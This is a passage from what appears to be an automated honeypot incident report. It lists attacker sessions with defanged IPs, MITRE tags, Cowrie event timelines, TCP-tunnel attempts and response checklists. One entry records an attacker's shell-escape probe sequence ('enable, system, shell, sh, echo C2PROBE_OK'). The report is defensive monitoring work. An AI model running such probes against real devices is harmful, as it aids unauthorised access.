| `2026-08-01 05:38:34` | `cowrie.session.params` |
| `2026-08-01 05:38:35` | `cowrie.telnet.option` |
| `2026-08-01 05:38:35` | `cowrie.telnet.option` |
| `2026-08-01 05:38:35` | `cowrie.command.input` |
| `2026-08-01 05:38:35` | `cowrie.command.failed` |
| `2026-08-01 05:38:35` | `cowrie.command.input` |
| `2026-08-01 05:38:35` | `cowrie.command.failed` |
| `2026-08-01 05:38:35` | `cowrie.command.input` |
| `2026-08-01 05:38:35` | `cowrie.command.failed` |
| `2026-08-01 05:38:35` | `cowrie.command.input` |
| `2026-08-01 05:38:35` | `cowrie.command.input` |
| `2026-08-01 05:38:35` | `cowrie.command.input` |
| `2026-08-01 05:38:35` | `cowrie.command.input` |
| `2026-08-01 05:38:36` | `cowrie.log.closed` |
| `2026-08-01 05:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.188.60[.]235` to AbuseIPDB if not already reported
- [ ] Block `190.188.60[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c33c5bff3331

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 05:38 |
| **Last Seen** | 2026-08-01 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:38:54` | `cowrie.session.connect` |
| `2026-08-01 05:38:54` | `cowrie.client.version` |
| `2026-08-01 05:38:55` | `cowrie.client.kex` |
| `2026-08-01 05:38:55` | `cowrie.login.success` |
| `2026-08-01 05:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c8f16467f96

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-01 05:38 |
| **Last Seen** | 2026-08-01 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:38:55` | `cowrie.session.connect` |
| `2026-08-01 05:38:55` | `cowrie.client.version` |
| `2026-08-01 05:38:55` | `cowrie.client.kex` |
| `2026-08-01 05:38:55` | `cowrie.login.success` |
| `2026-08-01 05:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4df63dd56aa

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-08-01 05:39 |
| **Last Seen** | 2026-08-01 05:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:39:28` | `cowrie.session.connect` |
| `2026-08-01 05:39:29` | `cowrie.client.version` |
| `2026-08-01 05:39:29` | `cowrie.client.kex` |
| `2026-08-01 05:39:30` | `cowrie.login.success` |
| `2026-08-01 05:39:31` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9204d6645e59

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-08-01 05:39 |
| **Last Seen** | 2026-08-01 05:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:39:42` | `cowrie.session.connect` |
| `2026-08-01 05:39:43` | `cowrie.client.version` |
| `2026-08-01 05:39:43` | `cowrie.client.kex` |
| `2026-08-01 05:39:44` | `cowrie.login.success` |
| `2026-08-01 05:39:45` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-755318f0a114

| Field | Detail |
|---|---|
| **Source IP** | `62.201.228[.]210` |
| **First Seen** | 2026-08-01 05:39 |
| **Last Seen** | 2026-08-01 05:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:39:50` | `cowrie.session.connect` |
| `2026-08-01 05:39:50` | `cowrie.client.version` |
| `2026-08-01 05:39:50` | `cowrie.client.kex` |
| `2026-08-01 05:39:52` | `cowrie.login.success` |
| `2026-08-01 05:39:52` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.228[.]210` to AbuseIPDB if not already reported
- [ ] Block `62.201.228[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-748d1ee03a98

| Field | Detail |
|---|---|
| **Source IP** | `42.248.129[.]234` |
| **First Seen** | 2026-08-01 05:41 |
| **Last Seen** | 2026-08-01 05:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:41:49` | `cowrie.session.connect` |
| `2026-08-01 05:41:50` | `cowrie.client.version` |
| `2026-08-01 05:41:50` | `cowrie.client.kex` |
| `2026-08-01 05:41:52` | `cowrie.login.success` |
| `2026-08-01 05:41:53` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.248.129[.]234` to AbuseIPDB if not already reported
- [ ] Block `42.248.129[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dec73399610

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-08-01 05:41 |
| **Last Seen** | 2026-08-01 05:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:41:57` | `cowrie.session.connect` |
| `2026-08-01 05:41:57` | `cowrie.client.version` |
| `2026-08-01 05:41:57` | `cowrie.client.kex` |
| `2026-08-01 05:41:59` | `cowrie.login.success` |
| `2026-08-01 05:42:00` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d707aa1c9f1

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-08-01 05:41 |
| **Last Seen** | 2026-08-01 05:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:41:57` | `cowrie.session.connect` |
| `2026-08-01 05:41:58` | `cowrie.client.version` |
| `2026-08-01 05:41:58` | `cowrie.client.kex` |
| `2026-08-01 05:41:58` | `cowrie.login.success` |
| `2026-08-01 05:41:59` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:42:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c86d2ea98f6

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-08-01 05:42 |
| **Last Seen** | 2026-08-01 05:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:42:03` | `cowrie.session.connect` |
| `2026-08-01 05:42:04` | `cowrie.client.version` |
| `2026-08-01 05:42:04` | `cowrie.client.kex` |
| `2026-08-01 05:42:06` | `cowrie.login.success` |
| `2026-08-01 05:42:07` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-849958509c4c

| Field | Detail |
|---|---|
| **Source IP** | `112.31.93[.]229` |
| **First Seen** | 2026-08-01 05:42 |
| **Last Seen** | 2026-08-01 05:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:42:07` | `cowrie.session.connect` |
| `2026-08-01 05:42:10` | `cowrie.client.version` |
| `2026-08-01 05:42:10` | `cowrie.client.kex` |
| `2026-08-01 05:42:12` | `cowrie.login.success` |
| `2026-08-01 05:42:13` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.93[.]229` to AbuseIPDB if not already reported
- [ ] Block `112.31.93[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7429e9263b5a

| Field | Detail |
|---|---|
| **Source IP** | `58.34.174[.]90` |
| **First Seen** | 2026-08-01 05:42 |
| **Last Seen** | 2026-08-01 05:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:42:23` | `cowrie.session.connect` |
| `2026-08-01 05:42:23` | `cowrie.client.version` |
| `2026-08-01 05:42:23` | `cowrie.client.kex` |
| `2026-08-01 05:42:26` | `cowrie.login.success` |
| `2026-08-01 05:42:26` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.34.174[.]90` to AbuseIPDB if not already reported
- [ ] Block `58.34.174[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f2485212dc

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-08-01 05:42 |
| **Last Seen** | 2026-08-01 05:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:42:50` | `cowrie.session.connect` |
| `2026-08-01 05:42:51` | `cowrie.client.version` |
| `2026-08-01 05:42:51` | `cowrie.client.kex` |
| `2026-08-01 05:42:52` | `cowrie.login.success` |
| `2026-08-01 05:42:53` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896e7871e85e

| Field | Detail |
|---|---|
| **Source IP** | `220.134.25[.]203` |
| **First Seen** | 2026-08-01 05:43 |
| **Last Seen** | 2026-08-01 05:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:43:00` | `cowrie.session.connect` |
| `2026-08-01 05:43:00` | `cowrie.client.version` |
| `2026-08-01 05:43:00` | `cowrie.client.kex` |
| `2026-08-01 05:43:02` | `cowrie.login.success` |
| `2026-08-01 05:43:02` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.134.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `220.134.25[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21554595d455

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-08-01 05:43 |
| **Last Seen** | 2026-08-01 05:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:43:03` | `cowrie.session.connect` |
| `2026-08-01 05:43:04` | `cowrie.client.version` |
| `2026-08-01 05:43:04` | `cowrie.client.kex` |
| `2026-08-01 05:43:05` | `cowrie.login.success` |
| `2026-08-01 05:43:05` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82fb962fc053

| Field | Detail |
|---|---|
| **Source IP** | `196.191.142[.]67` |
| **First Seen** | 2026-08-01 05:43 |
| **Last Seen** | 2026-08-01 05:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:43:09` | `cowrie.session.connect` |
| `2026-08-01 05:43:10` | `cowrie.client.version` |
| `2026-08-01 05:43:10` | `cowrie.client.kex` |
| `2026-08-01 05:43:11` | `cowrie.login.success` |
| `2026-08-01 05:43:11` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.191.142[.]67` to AbuseIPDB if not already reported
- [ ] Block `196.191.142[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ae380c0778

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-08-01 05:43 |
| **Last Seen** | 2026-08-01 05:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:43:46` | `cowrie.session.connect` |
| `2026-08-01 05:43:47` | `cowrie.client.version` |
| `2026-08-01 05:43:47` | `cowrie.client.kex` |
| `2026-08-01 05:43:48` | `cowrie.login.success` |
| `2026-08-01 05:43:49` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afaf082a84c1

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-01 05:43 |
| **Last Seen** | 2026-08-01 05:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:43:55` | `cowrie.session.connect` |
| `2026-08-01 05:43:56` | `cowrie.client.version` |
| `2026-08-01 05:43:56` | `cowrie.client.kex` |
| `2026-08-01 05:43:57` | `cowrie.login.success` |
| `2026-08-01 05:43:58` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:44:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02731240b26

| Field | Detail |
|---|---|
| **Source IP** | `41.63.63[.]211` |
| **First Seen** | 2026-08-01 05:43 |
| **Last Seen** | 2026-08-01 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:43:57` | `cowrie.session.connect` |
| `2026-08-01 05:43:59` | `cowrie.telnet.option` |
| `2026-08-01 05:43:59` | `cowrie.telnet.option` |
| `2026-08-01 05:45:00` | `cowrie.login.success` |
| `2026-08-01 05:45:00` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `41.63.63[.]211` to AbuseIPDB if not already reported
- [ ] Block `41.63.63[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1e8492a7f06

| Field | Detail |
|---|---|
| **Source IP** | `190.188.60[.]235` |
| **First Seen** | 2026-08-01 05:44 |
| **Last Seen** | 2026-08-01 05:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, echo C2PROBE_OK` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:44:56` | `cowrie.session.connect` |
| `2026-08-01 05:44:57` | `cowrie.telnet.option` |
| `2026-08-01 05:44:57` | `cowrie.login.success` |
| `2026-08-01 05:44:57` | `cowrie.session.params` |
| `2026-08-01 05:44:57` | `cowrie.telnet.option` |
| `2026-08-01 05:44:57` | `cowrie.telnet.option` |
| `2026-08-01 05:44:57` | `cowrie.command.input` |
| `2026-08-01 05:44:57` | `cowrie.command.failed` |
| `2026-08-01 05:44:57` | `cowrie.command.input` |
| `2026-08-01 05:44:57` | `cowrie.command.failed` |
| `2026-08-01 05:44:58` | `cowrie.command.input` |
| `2026-08-01 05:44:58` | `cowrie.command.failed` |
| `2026-08-01 05:44:58` | `cowrie.command.input` |
| `2026-08-01 05:44:58` | `cowrie.command.input` |
| `2026-08-01 05:44:58` | `cowrie.command.input` |
| `2026-08-01 05:44:58` | `cowrie.log.closed` |
| `2026-08-01 05:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.188.60[.]235` to AbuseIPDB if not already reported
- [ ] Block `190.188.60[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c07ec623f6ea

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-01 05:45 |
| **Last Seen** | 2026-08-01 05:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:45:34` | `cowrie.session.connect` |
| `2026-08-01 05:45:35` | `cowrie.client.version` |
| `2026-08-01 05:45:35` | `cowrie.client.kex` |
| `2026-08-01 05:45:36` | `cowrie.login.success` |
| `2026-08-01 05:45:36` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a06c1dce71bc

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-08-01 05:46 |
| **Last Seen** | 2026-08-01 05:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:46:08` | `cowrie.session.connect` |
| `2026-08-01 05:46:09` | `cowrie.client.version` |
| `2026-08-01 05:46:09` | `cowrie.client.kex` |
| `2026-08-01 05:46:10` | `cowrie.login.success` |
| `2026-08-01 05:46:11` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b9eb8260cf5

| Field | Detail |
|---|---|
| **Source IP** | `65.20.168[.]147` |
| **First Seen** | 2026-08-01 05:46 |
| **Last Seen** | 2026-08-01 05:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:46:32` | `cowrie.session.connect` |
| `2026-08-01 05:46:33` | `cowrie.client.version` |
| `2026-08-01 05:46:33` | `cowrie.client.kex` |
| `2026-08-01 05:46:34` | `cowrie.login.success` |
| `2026-08-01 05:46:34` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.168[.]147` to AbuseIPDB if not already reported
- [ ] Block `65.20.168[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c58919d378f3

| Field | Detail |
|---|---|
| **Source IP** | `58.226.255[.]240` |
| **First Seen** | 2026-08-01 05:46 |
| **Last Seen** | 2026-08-01 05:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:46:44` | `cowrie.session.connect` |
| `2026-08-01 05:46:44` | `cowrie.client.version` |
| `2026-08-01 05:46:44` | `cowrie.client.kex` |
| `2026-08-01 05:46:46` | `cowrie.login.success` |
| `2026-08-01 05:46:46` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.226.255[.]240` to AbuseIPDB if not already reported
- [ ] Block `58.226.255[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87ee898bca7e

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-01 05:47 |
| **Last Seen** | 2026-08-01 05:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:47:39` | `cowrie.session.connect` |
| `2026-08-01 05:47:39` | `cowrie.client.version` |
| `2026-08-01 05:47:39` | `cowrie.client.kex` |
| `2026-08-01 05:47:40` | `cowrie.login.success` |
| `2026-08-01 05:47:40` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-324697eb959c

| Field | Detail |
|---|---|
| **Source IP** | `31.173.66[.]222` |
| **First Seen** | 2026-08-01 05:47 |
| **Last Seen** | 2026-08-01 05:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:47:46` | `cowrie.session.connect` |
| `2026-08-01 05:47:46` | `cowrie.client.version` |
| `2026-08-01 05:47:46` | `cowrie.client.kex` |
| `2026-08-01 05:47:47` | `cowrie.login.success` |
| `2026-08-01 05:47:47` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
